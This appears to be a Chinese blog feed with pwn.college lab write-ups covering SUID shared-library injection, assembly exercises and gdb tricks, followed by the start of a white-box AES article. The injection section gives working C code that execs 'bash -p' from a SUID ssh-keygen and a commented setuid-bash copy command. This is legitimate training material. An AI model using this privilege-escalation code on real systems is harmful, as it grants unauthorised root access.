class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen -D ./file.s0<br></code></pre></td></tr></table></figure></li><li><p><code>gcc</code> 可以通过 <code>-shared</code> 参数来创建共享库，共享库不能单独运行，它相当于一个必须被别人调用才能运行的程序，它与普通二进制程序的区别可以通过file命令来查看，共享库没有<code>interpreter</code>这样的字段，也就是没有链接解释器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc file.c -shared -o file.so<br></code></pre></td></tr></table></figure></li><li><p><code>ldd</code> 用于打印程序或者库文件所依赖的共享库列表。我们可以利用它来查看是否有可操作的os共享库，注入我们的代码。另一种方法就是利用 <code>strace</code> 来查看程序运行全过程，然后使用grep来过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ldd /usr/bin/ssh-keygen<br>strace /usr/bin/ssh-keygen 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;<br></code></pre></td></tr></table></figure></li></ol><h3 id="wp"><a class="markdownIt-Anchor" href="#wp"></a> wp</h3><p>​编写c脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-comment">// 设置c语言的attribute属性来使函数在程序预处理阶段运行</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">()</span> __<span class="hljs-title function_">attribute__</span><span class="hljs-params">((constructor))</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">C_GetFunctionList</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;euid:%d\n&quot;</span>,geteuid()); <span class="hljs-comment">// 这里注意是geteuid，有效用户ID euid才是执行时真正有效的权限，uid获取的是实际用户ID ruid。这两者一般等同，但是在设置了suid之后会有不同，所以这里需要的是实际用户ID</span><br>sendfile(<span class="hljs-number">1</span>,open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>),<span class="hljs-number">0</span>,<span class="hljs-number">4096</span>); <span class="hljs-comment">// 它打开文件，然后将内容发送给标准输出显示</span><br>    <br>    <span class="hljs-comment">//这里在使用euid=0的权限时不要使用system()函数来运行shell代码，不然会以当前uid权限(ruid)来执行shell代码。这样就不能达到提权的效果</span><br><span class="hljs-comment">//system(&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&quot;);</span><br><span class="hljs-type">char</span> *argvv[]=&#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-p&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>execvp(<span class="hljs-string">&quot;/bin/bash&quot;</span>,argvv);<br>&#125;<br></code></pre></td></tr></table></figure><p>​执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc a.c -shared -o file.so<br>ssh-keygen -D ./file.so<br></code></pre></td></tr></table></figure><h1 id="assembly-crash-course"><a class="markdownIt-Anchor" href="#assembly-crash-course"></a> Assembly Crash Course</h1><h2 id="基础知识-2"><a class="markdownIt-Anchor" href="#基础知识-2"></a> 基础知识</h2><h3 id="命令行方式"><a class="markdownIt-Anchor" href="#命令行方式"></a> 命令行方式</h3><ol><li><p>gcc编译链接。gcc除了可以编译链接c语言后，还可以直接编译链接汇编代码。如果用汇编代码，一般是用不到std库和os共享库的，可以用 <strong>-nostdlib</strong> 和 <strong>-static</strong> 参数来处理，如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -nostdlib -static exit.s -o exit.elf  # .elf可以不加<br></code></pre></td></tr></table></figure><p>这样就能避免导入std库，也不用有main函数，同时采用静态链接的当时不会再引用动态库</p></li><li><p>strace 显示执行过程。这里使用strace来运行程序，会显示程序进行的每一个步骤。这里就发现，最简单的c程序也需要大量使用到动态链接库，而这里题目要求编写最为简单的汇编代码，就是不让使用动态链接。所以这里就是可以使用 strace 来查看程序的情况，以便解决问题。</p></li><li><p>objdump 显示二进制程序的所有模块(hd file可以以十六进制查看文件内容)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">objdump -M intel -d exit.elf<br><span class="hljs-meta prompt_"># </span><span class="language-bash">-M 指定指令集格式</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-d 反汇编全部</span><br></code></pre></td></tr></table></figure></li><li><p>objcopy 提取二进制程序模块，它可以将二进制程序中的模块汇编代码单独提取出来，转化为字节码存储</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">objcopy --dump-section .text=exit.bin exit.elf<br><span class="hljs-meta prompt_"># </span><span class="language-bash">--dump-section .text=exit.bin 指从输入文件中把.text节的内容提取出来保存到exit.bin中</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">exit.elf 是输入文件</span><br></code></pre></td></tr></table></figure></li><li><p>标准文件头，下面是汇编代码的指定需要包含的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.global _start        ; 定义_start为全局标签，它是程序的入口<br>.intel_syntax noprefix ; 切换到Intel语法，noprefix表示不适用前缀(不使用%作为寄存器的前缀)<br>_start:; 程序的起始点<br></code></pre></td></tr></table></figure></li><li><p>这里命令行方式的话提取的二进制会多一个0x48，反汇编之后是<strong>dec eax</strong>的意思，不过好像并没有被当做命令来显示。</p></li></ol><h3 id="python方式"><a class="markdownIt-Anchor" href="#python方式"></a> python方式</h3><p>​这里同时还可以使用pwntools来达到目的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br><br>r = process([<span class="hljs-string">&quot;/challenge/run&quot;</span>])<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rdi,0x1337</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>)  <span class="hljs-comment"># asm将汇编语言字符串转换为二进制代码</span><br>log.success(<span class="hljs-built_in">str</span>(payload))<br><br>r.send(payload)  <span class="hljs-comment"># 向子进程发送二进制代码，和上面操作一样</span><br><span class="hljs-comment"># r.interactive()  # 这个也行，与下面的操作是等价的</span><br>text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>    log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h2 id="level-1-2"><a class="markdownIt-Anchor" href="#level-1-2"></a> level 1</h2><blockquote><p>简单编写一下汇编代码</p></blockquote><p>​编写d.s的汇编文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.global _start<br>.intel_syntax noprefix<br>_start:<br>    mov rdi,0x1337<br></code></pre></td></tr></table></figure><h2 id="level-5-2"><a class="markdownIt-Anchor" href="#level-5-2"></a> level 5</h2><p>​这里都要求将rax作为最终存储结果的寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax,rdi<br>div rsi<br># 这里就是把被除数放到rax中，然后div会把rsi作为被除数，然后除以后面的寄存器，最后的除数会放在rax中。<br># rax / reg = x * rax + rdx -&gt; 就是rdx为余数，及mov rax, reg1; div reg2<br></code></pre></td></tr></table></figure><h2 id="level-8"><a class="markdownIt-Anchor" href="#level-8"></a> level 8</h2><p>​这里的意思就是模运算就是把数字转化为二进制表示，若是模数刚好是2的次方倍n，那么这个数后面的n位就是模后的结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 这里设置了rdi,rsi的值，然后<br>rax = rdi % 256<br>rbx = rsi % 65536<br><br>mov rcx,rdi<br>mov al,cl # 最后的8位<br>mov rdx,rsi<br>mov bx,dx # 最后的32位<br></code></pre></td></tr></table></figure><h2 id="level-10"><a class="markdownIt-Anchor" href="#level-10"></a> level 10</h2><blockquote><p>这里是对逻辑运算的理解</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and rdi,rsi<br>xor rax,rax # xor让rax为0<br>or rax,rdi  # 只有rax为0,后，or才能达到mov rax,rdi的目的<br></code></pre></td></tr></table></figure><h2 id="level-11-3"><a class="markdownIt-Anchor" href="#level-11-3"></a> level 11</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 这里得先把最后一位拿出来(and)，需要保证单独一位，不然会影响后面的判断<br>and rdi,1;只拿出最后一位进行判断<br>xor rdi,1<br>xor rax,rax<br>xor rax,rdi <br></code></pre></td></tr></table></figure><h2 id="level-18"><a class="markdownIt-Anchor" href="#level-18"></a> level 18</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax,[rdi]<br>add rax,[rdi+8]<br>mov [rsi],rax<br># 这里quad words指的是8个字节，所以需要+8<br></code></pre></td></tr></table></figure><h2 id="level-21"><a class="markdownIt-Anchor" href="#level-21"></a> level 21</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax,[rsp]<br>add rax,[rsp+0x8]<br>add rax,[rsp+0x10]<br>add rax,[rsp+0x18]<br>mov rbx,4<br>div rbx<br>mov [rsp-0x8],rax;手动设置一下栈顶之上的值<br>sub rsp,0x8;多加一个栈顶<br># 这里就是手动创建一个栈顶而不改变栈中其他值<br></code></pre></td></tr></table></figure><h2 id="level-23"><a class="markdownIt-Anchor" href="#level-23"></a> level 23</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp next<br>    .rept 0x51<br>        nop;这里就是填充0x51个nop<br>    .endr<br>next:<br>    mov rax,1<br># 这里就是设置相对跳转0x51字节，使用.rept---.endr来填充多个nop指令保证跳转到相对位置<br></code></pre></td></tr></table></figure><h2 id="level-25"><a class="markdownIt-Anchor" href="#level-25"></a> level 25</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 这里就是使用32位的寄存器，使用64位寄存器会报错(eax)，得注意数值精度问题，设置小精度数值，高位会自动清零<br>mov ebx,[rdi+4]<br>mov ecx,[rdi+8]<br>mov edx,[rdi+12]<br>mov eax,[rdi]<br>cmp eax,0x7f454c46<br>je equl;相等跳转<br>mov eax,[rdi]<br>cmp eax,0x00005A4D<br>je equl2;相等跳转<br>imul ebx,ecx<br>imul ebx,edx<br>jmp done;强制跳转<br>equl2:<br>    sub ebx,ecx<br>    sub ebx,edx<br>    jmp done<br>equl:<br>    add ebx,ecx<br>    add ebx,edx<br>done:<br>    mov eax,ebx<br></code></pre></td></tr></table></figure><h2 id="level-26"><a class="markdownIt-Anchor" href="#level-26"></a> level 26</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 这里是通过跳转表的特征来写代码的，很神奇<br>mov rax,rdi<br>and rax,0xfffffffffffffffc;如果and之后rax大于0，那么rax本身大于3，满足<br>je nomal<br>jmp [rsi+32];default的情况，跳转到指定位置<br>nomal:<br>jmp [rsi+rdi*8];其余情况，这里根据序号(rdi)与数值的对应关系来跳转<br></code></pre></td></tr></table></figure><h2 id="level-29"><a class="markdownIt-Anchor" href="#level-29"></a> level 29</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax,0   <br>    mov rsi,rdi;这里使用rsi指代rdi是因为调用foo函数也需要rdi传参，这两个参数不一样，需要区别对待<br>    cmp rsi,0<br>    je done<br>loop:<br>    mov bl,[rsi]<br>    cmp bl,0<br>    je done<br>    cmp bl,0x5a<br>    ja next<br>    mov dil,bl;dil是rdi的低八位，注意精度问题<br>    mov rdx,rax;rax作为i来存储，这里就是保存rax的内容，因为rax是foo函数的返回值<br>    mov rcx,0x403000<br>    call rcx<br>    mov [rsi],al<br>    mov rax,rdx<br>    add rax,1<br>next:           ;这个语句是都会运行的，所以要放在跳转的后面，这样才能保证都运行<br>    add rsi,1<br>    jmp loop<br>done:<br>    ret<br></code></pre></td></tr></table></figure><h2 id="level-30"><a class="markdownIt-Anchor" href="#level-30"></a> level 30</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push rbp<br>    mov rbp,rsp<br>    sub rsp,0x100<br>    mov rbx,-1;都是从-1开始，以便后面先增长，再其余步骤操作<br>loop1:<br>    add rbx,1<br>    cmp rbx,rsi<br>    je lp1<br>    mov cl,byte ptr [rdi+rbx] ;这里对于byte操作，需要对应位数的寄存器<br>    add byte ptr [rsp+rcx], 1;这里应该是stack_base减去的，但是这里是加，巧妙利用rsp和ebp的位置关系来操作<br>    jmp loop1<br>lp1:<br>    mov rbx,-1<br>    xor rcx,rcx<br>    xor rdx,rdx<br>loop2:<br>    add rbx,1<br>    cmp rbx,0x100<br>    je lp2<br>    cmp byte ptr [rsp+rbx], cl<br>    jle loop2<br>    mov cl,byte ptr [rsp+rbx]<br>    mov rdx,rbx<br>    jmp loop2<br>lp2:<br>    mov rax,rdx<br>    mov rsp,rbp<br>    pop rbp<br>    ret<br><br>/* 题目要求<br>most_common_byte(src_addr, size):<br>  i = 0<br>  while i &lt;= size-1:<br>    curr_byte = [src_addr + i]<br>    [stack_base - curr_byte] += 1<br>    i += 1<br><br>  b = 0<br>  max_freq = 0<br>  max_freq_byte = 0<br>  while b &lt;= 0xff:<br>    if [stack_base - b] &gt; max_freq:<br>      max_freq = [stack_base - b]<br>      max_freq_byte = b<br>    b += 1<br><br>  return max_freq_byte<br>  */<br></code></pre></td></tr></table></figure><h1 id="debugging-refresher"><a class="markdownIt-Anchor" href="#debugging-refresher"></a> Debugging Refresher</h1><blockquote><p>这里就是对于gdb的使用方法说明，具体细节看逆向技巧那篇博客</p></blockquote><h2 id="level-3"><a class="markdownIt-Anchor" href="#level-3"></a> level 3</h2><p>​搞清楚read的调用参数，这里就是寻找 <code>[rbp-0x18]</code> 的位置就是随机数的存储位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assemble"># read(0,buf,size)<br>#      rdi,rsi,rdx<br>0x000055d7450d6c42 &lt;+412&gt;:   mov    ecx,eax<br>0x000055d7450d6c44 &lt;+414&gt;:   lea    rax,[rbp-0x18] # 这里就是存储着随机数的位置，<br>0x000055d7450d6c48 &lt;+418&gt;:   mov    edx,0x8<br>0x000055d7450d6c4d &lt;+423&gt;:   mov    rsi,rax #又将数值传输给rsi参数，证实了这里是中间的buf<br>0x000055d7450d6c50 &lt;+426&gt;:   mov    edi,ecx<br>0x000055d7450d6c52 &lt;+428&gt;:   call   0x55d7450d6210 &lt;read@plt&gt;<br></code></pre></td></tr></table></figure><h2 id="level-4-2"><a class="markdownIt-Anchor" href="#level-4-2"></a> level 4</h2><p>​这里就是查看main函数的汇编代码，然后断点下在 <code>read</code> 函数处，使用 <code>ni</code> 步过函数，然后使用 <code>x/16xg $rsp</code> 查看堆栈，获得随机数后再次循环，总共需要4次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7ffe672316b0: 0x0000000000000002      0x00007ffe672317f8<br>0x7ffe672316c0: 0x00007ffe672317e8      0x00000001e51e4d60<br>0x7ffe672316d0: 0x0000000000000000      0xedff817a527d0977#这个0xedff817a527d0977就是随机数<br>0x7ffe672316e0: 0x00007ffe672317e0      0x54a353c8e7fd5400<br></code></pre></td></tr></table></figure><h2 id="level-5-3"><a class="markdownIt-Anchor" href="#level-5-3"></a> level 5</h2><blockquote><p>这里获得flag要有suid位，也就是用 <code>/challenge/embryogdb_level5 -x e.gdb</code> 来运行脚本</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">e.gdb脚本如下</span><br>run<br>b *main+762 #这里就是scanf和read之后的一个地方，这样可以直接设置数据了<br>commands<br>    silent<br>    set *(unsigned long long*)($rbp-0x10) = *(unsigned long long*)($rbp-0x18)<br>    continue<br>end<br>run rebort<br></code></pre></td></tr></table></figure><h2 id="level-6"><a class="markdownIt-Anchor" href="#level-6"></a> level 6</h2><h3 id="wp1-3"><a class="markdownIt-Anchor" href="#wp1-3"></a> wp1</h3><p>​这里按照 level 5的方案，计算随机值，但是很怪，在 <code>You input: </code> 的时候输入一个 <code>q</code> ，然后后面的输入就都跳过了，直接出flag了</p><h3 id="wp2-3"><a class="markdownIt-Anchor" href="#wp2-3"></a> wp2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00005646508e8d4c &lt;+678&gt;:   mov    rdx,QWORD PTR [rbp-0x10]<br>0x00005646508e8d50 &lt;+682&gt;:   mov    rax,QWORD PTR [rbp-0x18]<br>0x00005646508e8d54 &lt;+686&gt;:   cmp    rdx,rax<br>0x00005646508e8d57 &lt;+689&gt;:   je     0x5646508e8d63 &lt;main+701&gt;<br></code></pre></td></tr></table></figure><p>​这里就是关键是 cmp rdx,rax。如果相同的话，那么直接跳转到下面的函数，它之后会执行win函数。这样达到调整控制流的目的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">run<br>break *main+686<br>commands<br>    silent<br>    set $rdx = $rax<br>    continue<br>end<br>run rebort<br></code></pre></td></tr></table></figure><h2 id="level-7-2"><a class="markdownIt-Anchor" href="#level-7-2"></a> level 7</h2><p>​很惊奇，直接 <code>call (void)win()</code> 调用函数就出了，一开始还想着劫持返回地址来跳转来着，看来是想麻烦了。</p><p>​这里补充gdb中可以调用函数的约束</p><ol><li><strong>函数必须是可见的</strong>：在 GDB 中调用的函数必须是在当前调试的程序的可执行代码中可见的。如果函数是在外部库或未加载的模块中定义的，GDB 将无法直接调用它。</li><li><strong>函数必须是没有副作用的</strong>：GDB 中的函数调用是在调试过程中进行的，调用函数可能会影响程序状态，包括改变变量的值等。因此，最好只在调试过程中调用没有副作用的函数，以避免意外行为。</li></ol><h2 id="level-8-2"><a class="markdownIt-Anchor" href="#level-8-2"></a> level 8</h2><p>​这里是 win 函数出现了问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000556954fad951 &lt;+0&gt;:     endbr64 <br>0x0000556954fad955 &lt;+4&gt;:     push   rbp<br>0x0000556954fad956 &lt;+5&gt;:     mov    rbp,rsp<br>0x0000556954fad959 &lt;+8&gt;:     sub    rsp,0x10<br>0x0000556954fad95d &lt;+12&gt;:    mov    QWORD PTR [rbp-0x8],0x0<br>0x0000556954fad965 &lt;+20&gt;:    mov    rax,QWORD PTR [rbp-0x8]<br>0x0000556954fad969 &lt;+24&gt;:    mov    eax,DWORD PTR [rax] #此时rax=0，访问非法地址异常，所以这里有问题，出现segfault fault<br>0x0000556954fad96b &lt;+26&gt;:    lea    edx,[rax+0x1]<br>0x0000556954fad96e &lt;+29&gt;:    mov    rax,QWORD PTR [rbp-0x8]<br>0x0000556954fad972 &lt;+33&gt;:    mov    DWORD PTR [rax],edx<br>0x0000556954fad974 &lt;+35&gt;:    lea    rdi,[rip+0x73e]        # 0x556954fae0b9<br>0x0000556954fad97b &lt;+42&gt;:    call   0x556954fad180 &lt;puts@plt&gt;<br></code></pre></td></tr></table></figure><p>​这里就是跳转即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb)set $rip=0x0000556954fad97b<br>(gdb)c<br></code></pre></td></tr></table></figure><h1 id="others"><a class="markdownIt-Anchor" href="#others"></a> Others</h1><h2 id="网站"><a class="markdownIt-Anchor" href="#网站"></a> 网站</h2><ul><li><a href="https://gtfobins.github.io/">GTFOBins</a> -&gt; GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.</li></ul><blockquote><p><a href="https://tinysnow.github.io/%E6%8A%80%E6%9C%AF/%E5%85%B6%E4%BB%96%E8%B5%84%E6%96%99/pwn.college-writeup.html#program-interaction">参考wp1</a> <a href="https://www.buryia.top/">参考wp2</a> <a href="https://www.freebuf.com/author/thundersword">参考wp3</a> <a href="https://dem0dem0.top/2023/12/03/program_misuse/">参考wp4</a> <a href="https://tokameine.top">参考wp5</a> <a href="https://j-shiro.github.io/p/introduction/">参考wp6</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Pwn笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>白盒AES</title>
    <link href="/posts/7dd931db.html"/>
    <url>/posts/7dd931db.html</url>
    
    <content type="html"><![CDATA[<h1 id="原理分析"><a class="markdownIt-Anchor" href="#原理分析"></a> 原理分析</h1><h2 id="基本aes算法"><a class="markdownIt-Anchor" href="#基本aes算法"></a> 基本AES算法</h2><p>​AES算法基本就是两个过程，一个是明文的加密，一个是密钥轮的生成。</p><ul><li>对于明文的加密<ul><li>设中间值变量为state，它通常被描述为一个二维的字节数组，即一个4×4数组</li><li>轮密钥加：中间值state与16字节轮密钥进行异或</li><li>字节替换：通过S盒完成一个字节到另一个字节的映射</li><li>行位移：中间值state矩阵内部字节之间进行置换</li><li>列混淆：中间值state左乘一个在GF(256)上面的可逆矩阵，每次更新只影响中间值state的一列(4个字节)</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self, message: <span class="hljs-built_in">list</span>, round_keys: <span class="hljs-built_in">list</span></span>) -&gt; <span class="hljs-built_in">list</span>:<br>    state = self.AddRoundKey(message, round_keys, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">for</span> Round <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>): <span class="hljs-comment"># 1~9轮</span><br>        state = self.SubBytes(state)  <span class="hljs-comment"># 字节代换</span><br>        state = self.ShiftRows(state)  <span class="hljs-comment"># 行移位</span><br>        state = self.MixColumns(state)  <span class="hljs-comment"># 列混合</span><br>        state = self.AddRoundKey(state, round_keys, Round)  <span class="hljs-comment"># 轮密钥加</span><br>    state = self.SubBytes(state)<br>    state = self.ShiftRows(state)<br>    ciphertext = self.AddRoundKey(state, round_keys, <span class="hljs-number">10</span>)<br>    <span class="hljs-keyword">return</span> ciphertext<br></code></pre></td></tr></table></figure><p>​具体流程如下图</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401242251751.png" alt="image-20240124225106698" /></p><h2 id="基于表实现的aes算法"><a class="markdownIt-Anchor" href="#基于表实现的aes算法"></a> 基于表实现的AES算法</h2><blockquote><p>这里应该是Chow的实现方式，看的大多数白盒AES代码和题目也是这个，所以分析这种实现方式。</p></blockquote><h3 id="调整轮函数结构"><a class="markdownIt-Anchor" href="#调整轮函数结构"></a> 调整轮函数结构</h3><ul><li>基于表实现的AES算法将具体的加密流程顺序进行了变更<ol><li>重新定义for循环，将最开始的轮密钥加放入for循环中，第九轮的轮密钥加移除for循环</li><li>将行位移提至for循环的最前面，由于轮密钥加移到后面去了，所以每轮密钥都要先经过一次行位移再与明文进行异或，即密钥 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation 